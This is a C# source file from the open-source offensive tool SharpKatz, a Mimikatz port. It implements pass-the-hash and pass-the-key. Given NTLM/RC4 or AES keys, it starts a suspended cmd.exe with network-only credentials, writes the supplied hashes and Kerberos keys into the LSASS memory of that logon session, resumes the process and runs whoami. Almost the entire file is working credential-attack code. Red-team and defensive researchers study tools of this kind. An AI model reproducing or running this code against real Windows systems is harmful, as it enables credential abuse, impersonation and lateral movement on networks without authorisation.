//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using Microsoft.Win32.SafeHandles;
using SharpKatz.Credential;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Module.SharpKerberos;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    internal class Ptp
    {
        public const int AES_128_KEY_LENGTH = 16;
        public const int AES_256_KEY_LENGTH = 32;

        public static int CreateProcess(IntPtr hProcess, IntPtr lsasrvMem, IntPtr kerberos, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, string user, string domain, string ntlmHash = null, string aes128 = null, string aes256 = null, string rc4 = null, string binary = "cmd.exe", string arguments = "", string luid = null, bool impersonate = false)
        {
            TOKEN_STATISTICS tokenStats = new TOKEN_STATISTICS();
            byte[] aes128bytes = null;
            byte[] aes256bytes = null;
            Pth.SEKURLSA_PTH_DATA data = new Pth.SEKURLSA_PTH_DATA();
            byte[] ntlmHashbytes = null;
            int procid;

            if (!string.IsNullOrEmpty(luid))
            {
                tokenStats.AuthenticationId.HighPart = 0;
                tokenStats.AuthenticationId.LowPart = uint.Parse(luid);
                data.LogonId = tokenStats.AuthenticationId;
            }
            else
            {
                if (string.IsNullOrEmpty(user))
                {
                    Console.WriteLine("[x] Missing required parameter user");
                    return 1;
                }

                if (string.IsNullOrEmpty(domain))
                {
                    Console.WriteLine("[x] Missing required parameter domain");
                    return 1;
                }
            }

            try
            {
                if (!string.IsNullOrEmpty(aes128))
                {
                    aes128bytes = Utility.StringToByteArray(aes128);

                    if (aes128bytes.Length != AES_128_KEY_LENGTH)
                        throw new System.ArgumentException();

                    data.Aes128Key = aes128bytes;

                    Console.WriteLine("[*] AES128\t: {0}", Utility.PrintHexBytes(aes128bytes));
                }
            }
            catch (Exception)
            {
                Console.WriteLine("[x] Invalid aes128 key");
                return 1;
            }

            try
            {
                if (!string.IsNullOrEmpty(aes256))
                {
                    aes256bytes = Utility.StringToByteArray(aes256);

                    if (aes256bytes.Length != AES_256_KEY_LENGTH)
                        throw new System.ArgumentException();

                    data.Aes256Key = aes256bytes;

                    Console.WriteLine("[*] AES256\t: {0}", Utility.PrintHexBytes(aes256bytes));
                }
            }
            catch (Exception)
            {
                Console.WriteLine("[x] Invalid aes128 key");
                return 1;
            }

            try
            {
                if (!string.IsNullOrEmpty(rc4))
                    ntlmHashbytes = Utility.StringToByteArray(rc4);

                if (!string.IsNullOrEmpty(ntlmHash))
                    ntlmHashbytes = Utility.StringToByteArray(ntlmHash);

                if (ntlmHashbytes.Length != Msv1.LM_NTLM_HASH_LENGTH)
                    throw new System.ArgumentException();

                data.NtlmHash = ntlmHashbytes;
            }
            catch (Exception)
            {
                Console.WriteLine("[x] Invalid Ntlm hash/rc4 key");
                return 1;
            }

            if (data.NtlmHash != null || data.Aes128Key != null || data.Aes256Key != null)
            {
                if (!string.IsNullOrEmpty(luid))
                {
                    Pth_luid(hProcess, lsasrvMem, kerberos, oshelper, iv, aeskey, deskey, ref data);
                }
                else if (!string.IsNullOrEmpty(user))
                {
                    //pipe for stdin and stdout
                    var saHandles = new SECURITY_ATTRIBUTES();
                    saHandles.nLength = Marshal.SizeOf(saHandles);
                    saHandles.bInheritHandle = true;
                    saHandles.lpSecurityDescriptor = IntPtr.Zero;
                    IntPtr hStdOutRead;
                    IntPtr hStdOutWrite;
                    IntPtr hStdInRead;
                    IntPtr hStdInWrite;
                    // StdOut pipe
                    CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 999999);
                    SetHandleInformation(hStdOutRead, HANDLE_FLAGS.INHERIT, 0);
                    // StdIn pipe
                    CreatePipe(out hStdInRead, out hStdInWrite, ref saHandles, 999999);
                    SetHandleInformation(hStdInWrite, HANDLE_FLAGS.INHERIT, 0);
                    //
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    STARTUPINFOEX si = new STARTUPINFOEX();
                    si.StartupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFOEX));
                    si.StartupInfo.hStdInput = hStdInRead;
                    si.StartupInfo.hStdErr = hStdOutWrite;
                    si.StartupInfo.hStdOutput = hStdOutWrite;
                    si.StartupInfo.dwFlags = 0x00000001 | 0x00000100;
                    si.StartupInfo.wShowWindow = 0x0000;
                    if (!Win32.Natives.CreateProcessWithLogonW(user, "", domain, LogonFlags.NetCredentialsOnly, @"C:\Windows\System32\cmd.exe", @"C:\Windows\System32\cmd.exe", CreationFlags.CREATE_SUSPENDED, 0, @"C:\Windows\System32\", ref si, out pi))
                    {
                        procid = pi.dwProcessId;
                        IntPtr hToken = IntPtr.Zero;

                        if (OpenProcessToken(pi.hProcess, TOKEN_READ | (impersonate ? TOKEN_DUPLICATE : 0), out hToken))
                        {
                            IntPtr hTokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(tokenStats));
                            Marshal.StructureToPtr(tokenStats, hTokenInformation, false);

                            uint retlen = 0;

                            if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenStatistics, hTokenInformation, (uint)Marshal.SizeOf(tokenStats), out retlen))
                            {
                                tokenStats = (TOKEN_STATISTICS)Marshal.PtrToStructure(hTokenInformation, typeof(TOKEN_STATISTICS));
                                data.LogonId = tokenStats.AuthenticationId;

                                Pth_luid(hProcess, lsasrvMem, kerberos, oshelper, iv, aeskey, deskey, ref data);

                                if (data.isReplaceOk)
                                {
                                    NtResumeProcess(pi.hProcess);
                                    WriteToPipe(hStdInWrite, "/c whoami");
                                    Console.WriteLine(ReadFromPipe(pi.hProcess, hStdOutRead, Encoding.GetEncoding(GetConsoleOutputCP())));
                                    return procid;
                                }
                                else
                                {
                                    NtTerminateProcess(pi.hProcess, (uint)NTSTATUS.ProcessIsTerminating);
                                }
                            }
                            else
                            {
                                Console.WriteLine("[x] Error GetTokenInformazion");
                                return 1;
                            }
                        }
                        else
                        {
                            Console.WriteLine("[x] Error open process");
                            return 1;
                        }
                    }
                    else
                    {
                        Console.WriteLine("[x] Error process create");
                        return 1;
                    }
                }
                else
                {
                    Console.WriteLine("[x] Bad user or LUID");
                    return 1;
                }
            }
            else
            {
                Console.WriteLine("[x] Missing at least one argument : ntlm/rc4 OR aes128 OR aes256");
                return 1;
            }
            return 0;
        }

        private static void Pth_luid(IntPtr hProcess, IntPtr lsasrvMem, IntPtr kerberos, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, ref Pth.SEKURLSA_PTH_DATA data)
        {
            List<Logon> logonlist = new List<Logon>();
            LogonSessions.FindCredentials(hProcess, lsasrvMem, oshelper, iv, aeskey, deskey, logonlist);
            Msv1.WriteMsvCredentials(hProcess, oshelper, iv, aeskey, deskey, logonlist, ref data);
            List<KerberosLogonItem> klogonlist = SharpKerberos.FindCredentials(hProcess, kerberos, oshelper, iv, aeskey, deskey, logonlist);
            foreach (KerberosLogonItem s in klogonlist)
            {
                SharpKerberos.WriteKerberosKeys(ref hProcess, s, oshelper, iv, aeskey, deskey, ref data);
            }
        }

        public static bool WriteToPipe(IntPtr hStdInWrite, string command)
        {
            uint outbytes;
            byte[] cb = Encoding.ASCII.GetBytes(command + "\n\r");
            if (!WriteFile(hStdInWrite, cb, (uint)cb.Length, out outbytes, IntPtr.Zero))
            {
                Console.WriteLine("  [!] WriteFile failed to execute!: {0}", Marshal.GetLastWin32Error());
                return false;
            }
            return true;
        }

        public static string ReadFromPipe(IntPtr hProcess, IntPtr hStdOutRead, Encoding encoding)
        {
            SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
            var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), encoding, true);
            string result = "";
            bool exit = false;
            try
            {
                do
                {
                    if (WaitForSingleObject(hProcess, 100) == 0)
                    {
                        exit = true;
                    }

                    char[] buf = null;
                    int bytesRead;

                    uint bytesToRead = 0;

                    bool peekRet = PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

                    if (peekRet == true && bytesToRead == 0)
                    {
                        if (exit == true)
                        {
                            break;
                        }
                        else
                        {
                            continue;
                        }
                    }

                    if (bytesToRead > 4096)
                        bytesToRead = 4096;

                    buf = new char[bytesToRead];
                    bytesRead = reader.Read(buf, 0, buf.Length);
                    if (bytesRead > 0)
                    {
                        result += new string(buf);
                    }

                } while (true);
                reader.Close();
            }
            finally
            {
                if (!safeHandle.IsClosed)
                {
                    safeHandle.Close();
                }
            }
            return result;
        }

        //public static bool CreateProcessWithLogonW(string username, string password, string domain, string path, string binary, string arguments, CreationFlags cf, ref PROCESS_INFORMATION processInformation)
        //{
        //    
        //    if (!)
        //    {
        //        return false;
        //    }
        //    return true;
        //}
    }
}